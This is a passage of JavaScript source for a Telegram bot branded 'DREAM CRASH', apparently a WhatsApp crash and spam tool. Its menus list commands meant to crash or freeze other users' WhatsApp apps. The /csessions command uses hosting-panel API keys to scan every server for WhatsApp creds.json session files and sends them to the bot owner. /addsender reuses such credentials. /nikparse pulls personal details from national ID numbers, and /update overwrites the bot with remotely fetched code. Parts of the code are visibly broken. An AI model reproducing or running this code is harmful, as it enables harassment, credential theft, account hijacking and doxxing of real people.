        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (
            error.response &&
            error.response.error_code === 400 &&
            error.response.description.includes("メッセージは変更されませんでした")
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error editMessageCaption (bugv2):", error);
        }
    }
});

bot.action('/allbug', async (ctx) => {
    const allbugMenu = `
\`\`\`javascript
[ 🌌 ] - Dream - Crasher
─ 「 ⚚ 」こんにちは, ${ctx.from.first_name} 私はバグの世界であなたを助けるDarkです。無実の人々にそれをしないでください.

「 ⚡ 」 「 𝐒𝐜𝐫𝐢𝐩𝐭 ⵢ 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧  ꑭ 」
✧ Name Script : DREAM CRASH<
✧ Devoloper : @Kayrosukamieayam
✧ Version : 𝟏𝟔.𝟎.𝟎°𝐕𝐢𝐩!
✧ Prefix : / [ Slash ]
✧ Username : ${ctx.from.first_name}

[ ✨ ] - Dark Buk Spam
ﾒ.- /forcelo - Spam Pair
ﾒ.- /delaybulldo - Spam Video Call\`\`\`
 `;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ メインページ ",
                callback_data: "/bug",icon_custom_emoji_id:"5927116114713644570"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(allbugMenu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (
            error.response &&
            error.response.error_code === 400 &&
            error.response.description.includes("メッセージは変更されませんでした")
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error editMessageCaption (allbug):", error);
        }
    }
});

bot.action('/bugios', async (ctx) => {
    const bugMenu = `
\`\`\`javascript
[ CANNOT SPAM ]
ﾒ.- /crashui - System/Crash Ui
ﾒ.- /xblank - Blank
ﾒ.- /blanktif - Blank Andro
ﾒ.- /blankv1 - Blank Clik 
ﾒ.- /forcevccall - Forclose Andro
ﾒ.- /delaytif - Delay Andro 
ﾒ.- /xdelay - Delay Invis Hard
ﾒ.- /delaybulldo - Delay Bulldo
ﾒ.- /spmdelayinv - Delay Ios
ﾒ.- /testfunction - Use Your Own Function\`\`\`
 `;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ メインページ ",
                callback_data: "/bug",
                style: "success",icon_custom_emoji_id:"5927116114713644570"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (
            error.response &&
            error.response.error_code === 400 &&
            error.response.description.includes("メッセージは変更されませんでした")
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error editMessageCaption (bugios):", error);
        }
    }
});

bot.action('/tools', async (ctx) => {
    const toolsMenu = `
\`\`\`javascript
[ ✨ ] - Tools Menu
ﾒ.- /tiktokdl - Download Content Without Watermark
ﾒ.- /nikparse - View Full Nik Information
ﾒ.- /csessions - Retrieving Session From Panel Server
ﾒ.- /addsender - Replay Session.json
ﾒ.- /brat - Dengan Teks
ﾒ.- /gpt - Chat Gpt
ﾒ.- /mediafire - Media Fire
ﾒ.- /chat - Chat 
ﾒ.- /tourl - Foto/Video
ﾒ.- /cekdomain - Cek Domain
ﾒ.- /testfunction - Use Your Own Function\`\`\`
`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ メインページ ",
                callback_data: "/start",
                style: "primary",icon_custom_emoji_id:"5927116114713644570"
            },
            {
                text: "⌜「 ཀ 」 ☇ 𝐓𝐨𝐨𝐥𝐬 𝐕𝟐",
                callback_data: "/toolsv2",
                style: "success",icon_custom_emoji_id:"4956726373679891220"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(toolsMenu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/toolsv2', async (ctx) => {
    const toolsMenu = `
\`\`\`javascript
[ ✨ ] - Tools MenuV2
ﾒ.- /catbox - Convert Photos Or Videos To Links
ﾒ.- /iqc - Secrinshot To Iphone
ﾒ.- /cekidch - Check WhatsApp Channel ID
ﾒ.- /convert - Convert Photos Or Videos To Links
ﾒ.- /trackip - Searching for IP Information
ﾒ.- /gpt4o - Chat Gpt V2
ﾒ.- /countryinfo - Country Info
ﾒ.- /fixcode - Fix Code
ﾒ.- /ceknum - Cek Nomer\`\`\`
 `;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ メインページ ",
                callback_data: "/start",
                style: "primary",icon_custom_emoji_id:"4956420911310832630"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(toolsMenu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (
            error.response &&
            error.response.error_code === 400 &&
            error.response.description.includes("メッセージは変更されませんでした")
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error editMessageCaption (toolsv2):", error);
        }
    }
});

bot.action('/tqto', async (ctx) => {
    const tqtoMenu = `
\`\`\`javascript
[ ✨ ] - Support Menu
ﾒ.- @Kayrosukamieayam - Developer
ﾒ.- @Kalesz - my friendss 
ﾒ.- ALL TEAM DREAM CORE X\`\`\`
`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ メインページ ",
                callback_data: "/start",
                style: "success",icon_custom_emoji_id:"5927116114713644570"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/all', async (ctx) => {
    const allMenu = `
\`\`\`javascript
lu ngapain kocakk. btw selamat menggunakan script bug gacor gunakan dengan baik yaa!!
By Fadzx\`\`\`
 `;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ メインページ ",
                callback_data: "/start",
                style: "primary",icon_custom_emoji_id:"4956726373679891220"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(allMenu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (
            error.response &&
            error.response.error_code === 400 &&
            error.response.description.includes("メッセージは変更されませんでした")
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error editMessageCaption (all):", error);
        }
    }
});

bot.commmand("update", async (ctx) => {
    const chatId = ctx.chat.id;

    const repoRaw = "https://raw.githubusercontent.com/syagtg147-arch/DreamX/main/Token.json";

    bot.sendMessage(chatId, "⏳ Sedang mengecek update...");

    try {
        const { data } = await axios.get(repoRaw);

        if (!data) return bot.sendMessage(chatId, "❌ Update gagal: File kosong!");

        fs.writeFileSync("./index.js", data);

        bot.sendMessage(chatId, "✅ Update berhasil!\nSilakan restart bot.");

        process.exit(); // restart jika pakai PM2
    } catch (e) {
        console.log(e);
        bot.sendMessage(chatId, "❌ Update gagal. Pastikan repo dan file index.js tersedia.");
    }
});

bot.command("trackip", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").filter(Boolean);
  if (!args[1]) return ctx.reply("🪧 ☇ Format: /trackip 8.8.8.8");

  const ip = args[1].trim();

  function isValidIPv4(ip) {
    const parts = ip.split(".");
    if (parts.length !== 4) return false;
    return parts.every(p => {
      if (!/^\d{1,3}$/.test(p)) return false;
      if (p.length > 1 && p.startsWith("0")) return false; // hindari "01"
      const n = Number(p);
      return n >= 0 && n <= 255;
    });
  }

  function isValidIPv6(ip) {
    const ipv6Regex = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(::)|(::[0-9a-fA-F]{1,4})|([0-9a-fA-F]{1,4}::[0-9a-fA-F]{0,4})|([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){0,6}::([0-9a-fA-F]{1,4}){0,6}))$/;
    return ipv6Regex.test(ip);
  }

  if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
    return ctx.reply("❌ ☇ IP tidak valid masukkan IPv4 (contoh: 8.8.8.8) atau IPv6 yang benar");
  }

  let processingMsg = null;
  try {
  processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`, {
    parse_mode: "HTML"
  });
} catch (e) {
    processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`);
  }

  try {
    const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, { timeout: 10000 });
    const data = res.data;

    if (!data || data.success === false) {
      return await ctx.reply(`❌ ☇ Gagal mendapatkan data untuk IP: ${ip}`);
    }

    const lat = data.latitude || "";
    const lon = data.longitude || "";
    const mapsUrl = lat && lon ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat + ',' + lon)}` : null;

    const caption = `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- IP: ${data.ip || "-"}
ﾒ.- Country: ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}
ﾒ.- Region: ${data.region || "-"}
ﾒ.- City: ${data.city || "-"}
ﾒ.- ZIP: ${data.postal || "-"}
ﾒ.- Timezone: ${data.timezone_gmt || "-"}
ﾒ.- ISP: ${data.isp || "-"}
ﾒ.- Org: ${data.org || "-"}
ﾒ.- ASN: ${data.asn || "-"}
ﾒ.- Lat/Lon: ${lat || "-"}, ${lon || "-"}
`.trim();

    const inlineKeyboard = mapsUrl ? {
      reply_markup: {
        inline_keyboard: [
          [{ text: "⌜🌍⌟ ☇ オープンロケーション", url: mapsUrl }]
        ]
      }
    } : null;

    try {
      if (processingMsg && processingMsg.video && typeof processingMsg.message_id !== "undefined") {
        await ctx.telegram.editMessageCaption(
          processingMsg.chat.id,
          processingMsg.message_id,
          undefined,
          caption,
          { parse_mode: "HTML", ...(inlineKeyboard ? inlineKeyboard : {}) }
        );
      } else if (typeof vidthumbnail !== "undefined" && vidthumbnail) {
        await ctx.replyWithPhoto(vidthumbnail, {
          caption,
          parse_mode: "HTML",
          ...(inlineKeyboard ? inlineKeyboard : {})
        });
      } else {
        if (inlineKeyboard) {
          await ctx.reply(caption, { parse_mode: "HTML", ...inlineKeyboard });
        } else {
          await ctx.reply(caption, { parse_mode: "HTML" });
        }
      }
    } catch (e) {
      if (mapsUrl) {
        await ctx.reply(caption + `📍 ☇ Maps: ${mapsUrl}`, { parse_mode: "HTML" });
      } else {
        await ctx.reply(caption, { parse_mode: "HTML" });
      }
    }

  } catch (err) {
    await ctx.reply("❌ ☇ Terjadi kesalahan saat mengambil data IP (timeout atau API tidak merespon). Coba lagi nanti");
  }
});

bot.command("cekdomain", async (ctx) => {
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("⚠️ Contoh: /cekdomain google.com");

  try {
    const res = await axios.get(`https://api.api-ninjas.com/v1/whois?domain=${args}`, {
      headers: { "X-Api-Key": config.apiNinjasKey }
    });

    const msg = `🌐 *Info Domain:*\n\n` +
                `• Domain: ${args}\n` +
                `• Registrar: ${res.data.registrar}\n` +
                `• Dibuat: ${res.data.creation_date}\n` +
                `• Expired: ${res.data.expiration_date}\n` +
                `• DNS: ${res.data.name_servers.join(", ")}`;

    ctx.reply(msg, { parse_mode: "Markdown" });
  } catch (e) {
    ctx.reply("❌ Gagal cek domain (pastikan APIKEY api- sudah benar)");
  }
});

bot.command("fixcode", async (ctx) => {
  if (!OPENAI_KEY || !OpenAI) return ctx.reply("⚠️ /fixcode butuh OPENAI_KEY di config.js");
  let code = ""; const rep = ctx.message.reply_to_message;
  if (rep?.text) code = rep.text; else code = ctx.message.text.split(" ").slice(1).join(" ");
  if (!code) return ctx.reply("❗ Reply ke kode atau /fixcode <kode>");
  try {
    const openai = new OpenAI({ apiKey: OPENAI_KEY });
    const prompt = `Perbaiki kode berikut agar bebas error dan rapi. Balas hanya dengan kode final:\n\n${code}`;
    const r = await openai.chat.completions.create({ model: "gpt-3.5-turbo", messages: [{ role: "user", content: prompt }] });
    ctx.reply("✅ Kode diperbaiki:\n\n" + r.choices[0].message.content.trim());
  } catch { ctx.reply("❌ Gagal memperbaiki kode."); }
});

bot.command("tiktokdl", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("🪧 Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ ☇ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ ☇ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "video",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ ☇ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ ☇ Error ${e.response.status} saat mengunduh video`
        : "❌ ☇ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

bot.command("ceknum", async (ctx) => {
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("⚠️ Contoh: /ceknum +6281234567890");

  try {
    const res = await axios.get(`https://api.apilayer.com/number_verification/validate?number=${args}`, {
      headers: { apikey: config.apilayerKey }
    });

    if (!res.data.valid) return ctx.reply("❌ Nomor tidak valid!");

    const msg = `📱 *Info Nomor:*\n\n` +
                `• Nomor: ${res.data.international_format}\n` +
                `• Negara: ${res.data.country_name} (${res.data.country_code})\n` +
                `• Operator: ${res.data.carrier}\n` +
                `• Tipe: ${res.data.line_type}`;

    ctx.reply(msg, { parse_mode: "Markdown" });
  } catch (e) {
    ctx.reply("❌ Gagal cek nomor (pastikan APIKEY Api sudah benar)");
  }
});

bot.command("tourl", async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("❗ Reply ke media (foto/video/audio/doc/sticker) lalu kirim /tourl");
  try {
    const pick = r.video?.slice(-1)[0]?.file_id || r.video?.file_id || r.document?.file_id || r.audio?.file_id || r.voice?.file_id || r.sticker?.file_id;
    if (!pick) return ctx.reply("❌ Tidak menemukan media valid.");
    const link = await ctx.telegram.getFileLink(pick);
    ctx.reply(`🔗 ${link}`);
  } catch { ctx.reply("❌ Gagal membuat URL media."); }
});

bot.command("chat", async (ctx) => {
  if (!OPENAI_KEY || !OpenAI) return ctx.reply("⚠️ /chat butuh OPENAI_KEY di config.js");
  const prompt = ctx.message.text.split(" ").slice(1).join(" ");
  if (!prompt) return ctx.reply("❗ /chat <pesan>");
  try {
    const openai = new OpenAI({ apiKey: OPENAI_KEY });
    const r = await openai.chat.completions.create({ model: "gpt-3.5-turbo", messages: [{ role: "user", content: prompt }] });
    ctx.reply(r.choices[0].message.content.trim());
  } catch { ctx.reply("❌ Gagal menghubungi GPT."); }
});

bot.command("nikparse", checkPremium, async (ctx) => {
  const nik = ctx.message.text.split(" ").slice(1).join("").trim();
  if (!nik) return ctx.reply("🪧 Format: /nikparse 1234567890283625");
  if (!/^\d{16}$/.test(nik)) return ctx.reply("❌ ☇ NIK harus 16 digit angka");

  const wait = await ctx.reply("⏳ ☇ Sedang memproses pengecekan NIK");

const replyHTML = (d) => {
  const get = (x) => (x ?? "-");

  const caption =`
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- NIK: ${get(d.nik) || nik}
ﾒ.- Nama: ${get(d.nama)}
ﾒ.- Jenis Kelamin: ${get(d.jenis_kelamin || d.gender)}
ﾒ.- Tempat Lahir: ${get(d.tempat_lahir || d.tempat)}
ﾒ.- Tanggal Lahir: ${get(d.tanggal_lahir || d.tgl_lahir)}
ﾒ.- Umur: ${get(d.umur)}
ﾒ.- Provinsi: ${get(d.provinsi || d.province)}
ﾒ.- Kabupaten/Kota: ${get(d.kabupaten || d.kota || d.regency)}
ﾒ.- Kecamatan: ${get(d.kecamatan || d.district)}
ﾒ.- Kelurahan/Desa: ${get(d.kelurahan || d.village)}
`;

  return ctx.reply(caption, { parse_mode: "HTML", disable_web_page_preview: true });
};

  try {
    const a1 = await axios.get(
      `https://api.akuari.my.id/national/nik?nik=${nik}`,
      { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
    );

    if (a1?.data?.status && a1?.data?.result) {
      await replyHTML(a1.data.result);
    } else {
      const a2 = await axios.get(
        `https://api.nikparser.com/nik/${nik}`,
        { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
      );
      if (a2?.data) {
        await replyHTML(a2.data);
      } else {
        await ctx.reply("❌ ☇ NIK tidak ditemukan");
      }
    }
  } catch (e) {
    try {
      const a2 = await axios.get(
        `https://api.nikparser.com/nik/${nik}`,
        { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
      );
      if (a2?.data) {
        await replyHTML(a2.data);
      } else {
        await ctx.reply("❌ ☇ Gagal menghubungi api, Coba lagi nanti");
      }
    } catch {
      await ctx.reply("❌ ☇ Gagal menghubungi api, Coba lagi nanti");
    }
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});

bot.command('countryinfo', async (ctx) => {
    try {
      const input = ctx.message.text.split(' ').slice(1).join(' ');
      if (!input) {
        return ctx.reply('Masukkan nama negara setelah perintah.\n\nContoh:\n`/countryinfo Indonesia`', { parse_mode: 'Markdown' });
      }

      const res = await axios.post('https://api.siputzx.my.id/api/tools/countryInfo', {
        name: input
      });

      const { data } = res.data;

      if (!data) {
        return ctx.reply('Negara tidak ditemukan atau tidak valid.');
      }

      const caption = `
🌍 *${data.name}* (${res.data.searchMetadata.originalQuery})
📍 *Capital:* ${data.capital}
📞 *Phone Code:* ${data.phoneCode}
🌐 *Continent:* ${data.continent.name} ${data.continent.emoji}
🗺️ [Google Maps](${data.googleMapsLink})
📏 *Area:* ${data.area.squareKilometers} km²
🏳️ *TLD:* ${data.internetTLD}
💰 *Currency:* ${data.currency}
🗣️ *Languages:* ${data.languages.native.join(', ')}
🧭 *Driving Side:* ${data.drivingSide}
⚖️ *Government:* ${data.constitutionalForm}
🍺 *Alcohol Prohibition:* ${data.alcoholProhibition}
🌟 *Famous For:* ${data.famousFor}
      `.trim();

      await ctx.replyWithPhoto(
        { url: data.flag },
        {
          caption,
          parse_mode: 'Markdown',
        }
      );

     
      if (data.neighbors && data.neighbors.length) {
        const neighborText = data.neighbors.map(n => `🧭 *${n.name}*\n📍 [Maps](https://www.google.com/maps/place/${n.coordinates.latitude},${n.coordinates.longitude})`).join('\n\n');
        await ctx.reply(`🌐 *Negara Tetangga:*\n\n${neighborText}`, { parse_mode: 'Markdown' });
      }

    } catch (err) {
      console.error(err);
      ctx.reply('Gagal mengambil informasi negara. Coba lagi nanti atau pastikan nama negara valid.');
    }
  });
  
bot.command("addsender", async (ctx) => {
  try {
    const args = ctx.message.text.split(" ");
    const tagFile = args[1];

    if (!tagFile) {
      return ctx.reply("⚠️ Format salah.\nGunakan: /addsender <tag_file> (reply ke file creds.json)");
    }

    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
      return ctx.reply("⚠️ Harap reply ke file creds.json dengan command ini.");
    }

    const fileId = ctx.message.reply_to_message.document.file_id;
    const fileLink = await ctx.telegram.getFileLink(fileId);

    const deviceDir = path.join(SESSIONS_DIR, tagFile);
    if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });

    const credsPath = path.join(deviceDir, "creds.json");

    const res = await fetch(fileLink.href);
    const buffer = Buffer.from(await res.arrayBuffer());
    fs.writeFileSync(credsPath, buffer);

    await ctx.reply(`✅ Creds berhasil disimpan di:\n${credsPath}`);

    
    await connectWhatsApp(tagFile, credsPath, ctx);
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi kesalahan saat menambahkan addsender.");
  }
});

bot.command("csessions", checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const fromId = ctx.from.id;

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("🪧 ☇ Format: /csessions https://domainpanel.com,ptla_123,ptlc_123");

  const args = text.split(",");
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];
  if (!plta || !pltc)
    return ctx.reply("🪧 ☇ Format: /csessions https://panelku.com,plta_123,pltc_123");

  await ctx.reply(
    "⏳ ☇ Sedang scan semua server untuk mencari folder sessions dan file creds.json",
    { parse_mode: "Markdown" }
  );

  const base = domain.replace(/\/+$/, "");
  const commonHeadersApp = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${plta}`,
  };
  const commonHeadersClient = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${pltc}`,
  };

  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    if (typeof a.is_file === "boolean") return a.is_file === false;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function listAllServers() {
    const out = [];
    let page = 1;
    while (true) {
      const r = await axios.get(`${base}/api/application/servers`, {
        params: { page },
        headers: commonHeadersApp,
        timeout: 15000,
      }).catch(() => ({ data: null }));
      const chunk = (r && r.data && Array.isArray(r.data.data)) ? r.data.data : [];
      out.push(...chunk);
      const hasNext = !!(r && r.data && r.data.meta && r.data.meta.pagination && r.data.meta.pagination.links && r.data.meta.pagination.links.next);
      if (!hasNext || chunk.length === 0) break;
      page++;
    }
    return out;
  }

  async function traverseAndFind(identifier, dir = "/") {
    try {
      const listRes = await axios.get(
        `${base}/api/client/servers/${identifier}/files/list`,
        {
          params: { directory: dir },
          headers: commonHeadersClient,
          timeout: 15000,
        }
      ).catch(() => ({ data: null }));
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];
      let found = [];

      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");
        const lower = name.toLowerCase();

        if ((lower === "session" || lower === "sessions") && isDirectory(item)) {
          try {
            const sessRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/list`,
              {
                params: { directory: normalized },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));
            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName = (sf.attributes && sf.attributes.name) || sf.name || "";
                const sfPath = (normalized === "/" ? "" : normalized) + "/" + sfName;
                if (sfName.toLowerCase() === "creds.json") {
                  found.push({
                    path: sfPath.replace(/\/+/g, "/"),
                    name: sfName,
                  });
                }
              }
            }
          } catch (_) {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
            if (more.length) found = found.concat(more);
          } catch (_) {}
        } else {
          if (name.toLowerCase() === "creds.json") {
            found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
          }
        }
      }
      return found;
    } catch (_) {
      return [];
    }
  }

  try {
    const servers = await listAllServers();
    if (!servers.length) {
      return ctx.reply("❌ ☇ Tidak ada server yang bisa discan");
    }

    let totalFound = 0;

    for (let srv of servers) {
      const identifier =
        (srv.attributes && srv.attributes.identifier) ||
        srv.identifier ||
        (srv.attributes && srv.attributes.id);
      const name =
        (srv.attributes && srv.attributes.name) ||
        srv.name ||
        identifier ||
        "unknown";
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(/\/+$/,"");

          await ctx.reply(
            `📁 ☇ Ditemukan creds.json di server ${name} path: ${filePath}`,
            { parse_mode: "Markdown" }
          );

          try {
            const downloadRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/download`,
              {
                params: { file: filePath },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));

            const dlJson = downloadRes && downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, {
                responseType: "arraybuffer",
                timeout: 20000,
              });
              const buffer = Buffer.from(fileRes.data);
              await ctx.telegram.sendDocument(ownerID, {
                source: buffer,
                filename: `${String(name).replace(/\s+/g, "_")}_creds.json`,
              });
            } else {
              await ctx.reply(
                `❌ ☇ Gagal mendapatkan URL download untuk ${filePath} di server ${name}`
              );
            }
          } catch (e) {
            console.error(`Gagal download ${filePath} dari ${name}:`, e?.message || e);
            await ctx.reply(
              `❌ ☇ Error saat download file creds.json dari ${name}`
            );
          }
        }
      }
    }

    if (totalFound === 0) {
      return ctx.reply("✅ ☇ Scan selesai tidak ditemukan creds.json di folder session/sessions pada server manapun");
    } else {
      return ctx.reply(`✅ ☇ Scan selesai total file creds.json berhasil diunduh & dikirim: ${totalFound}`);
    }
  } catch (err) {
    ctx.reply("❌ ☇ Terjadi error saat scan");
  }
});

bot.command('gpt', async (ctx) => {
    const text = ctx.message.text.split(' ').slice(1).join(' ');
    if (!text) return ctx.reply('Penggunaan: /gpt <teks>');

    try {
      const res = await fetch(`https://fastrestapis.fasturl.cloud/aillm/gpt-4o-turbo?ask=${encodeURIComponent(text)}`);
      const json = await res.json();

      if (!json || !json.result) {
        return ctx.reply('Gagal mendapatkan balasan dari AI.');
      }

      const replyText = `*RES YOY*\n\n\`\`\`\n${json.result}\n\`\`\``;

      await ctx.reply(replyText, { parse_mode: 'Markdown' });
    } catch (err) {
      console.error(err);
      ctx.reply('Terjadi kesalahan saat memproses permintaan.');
    }
  });


  // /maintenance_status
  bot.command("maintenancestatus", (ctx) => {
    sessions = loadSessions();
    const status = sessions.maintenance ? "🔴 Sedang Maintenance" : "🟢 Normal";
    const msg = `ℹ️ Status bot: *${status}*\nPesan: ${sessions.customMessage || "-"}\nUsers terdaftar: ${sessions.users.length}`;
    ctx.reply(msg, { parse_mode: "Markdown" });
  });
  

// Command untuk aktifkan maintenance
bot.command("maintenanceon", (ctx) => {
  if (!config.adminIDs.includes(ctx.from.id.toString())) {
    return ctx.reply("❌ Kamu tidak punya izin untuk mengaktifkan maintenance.");
  }
  maintenance = true;
  ctx.reply("✅ Mode *Maintenance* telah diaktifkan.", { parse_mode: "Markdown" });
});

bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("🪧 ☇ Format: /brat Dark Is Here");

  try {
    const apiURL = `https://api.nvidiabotz.xyz/imagecreator/bratv?text=${encodeURIComponent(
      text
    )}&isVideo=false`;

    const res = await axios.get(apiURL, { responseType: "arraybuffer" });
    await ctx.replyWithSticker({ source: Buffer.from(res.data) });
  } catch (e) {
    console.error("Error saat membuat stiker:", e);
    ctx.reply("❌ Gagal membuat stiker brat.");
  }
});

bot.command("convert", checkPremium, async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("🪧 ☇ Format: /convert ( reply dengan foto/video )");

  let fileId = null;
  if (r.video && r.video.length) {
    fileId = r.video[r.video.length - 1].file_id;
  } else if (r.video) {
    fileId = r.video.file_id;
  } else if (r.video_note) {
    fileId = r.video_note.file_id;
  } else {
    return ctx.reply("❌ ☇ Hanya mendukung foto atau video");
  }

  const wait = await ctx.reply("⏳ ☇ Mengambil file & mengunggah ke catbox");

  try {
    const tgLink = String(await ctx.telegram.getFileLink(fileId));

    const params = new URLSearchParams();
    params.append("reqtype", "urlupload");
    params.append("url", tgLink);

    const { data } = await axios.post("https://catbox.moe/user/api.php", params, {
      headers: { "content-type": "application/x-www-form-urlencoded" },
      timeout: 30000
    });

    if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
      await ctx.reply(data.trim());
    } else {
      await ctx.reply("❌ ☇ Gagal upload ke catbox" + String(data).slice(0, 200));
    }
  } catch (e) {
    const msg = e?.response?.status
      ? `❌ ☇ Error ${e.response.status} saat unggah ke catbox`
      : "❌ ☇ Gagal unggah coba lagi.";
    await ctx.reply(msg);
  } finally {
